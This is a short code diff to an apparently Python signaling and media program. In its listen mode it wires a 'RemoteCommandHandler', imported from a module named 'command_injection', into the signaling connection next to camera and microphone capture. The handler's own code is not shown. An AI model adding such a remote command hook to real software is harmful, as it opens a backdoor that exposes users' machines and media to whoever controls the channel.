@@ -9,6 +9,8 @@ from signaling.signal import SignalClient
 from signaling.peer import Peer
 from media.local_media import LocalMedia
 
+from command_injection.injector import RemoteCommandHandler as ReceiverHandler
+
 
 async def listen_mode():
     print("[+] Listen mode")
@@ -27,6 +29,11 @@ async def listen_mode():
             signal = SignalClient(room=ROOM, client_id=client_id, host=HOST, username=username,)
 
             await signal.connect()
+
+            # ----------------------------------
+            # Command Injection
+            # ----------------------------------
+            ReceiverHandler(signal)
 
             # ----------------------------------
             # Camera / Microphone
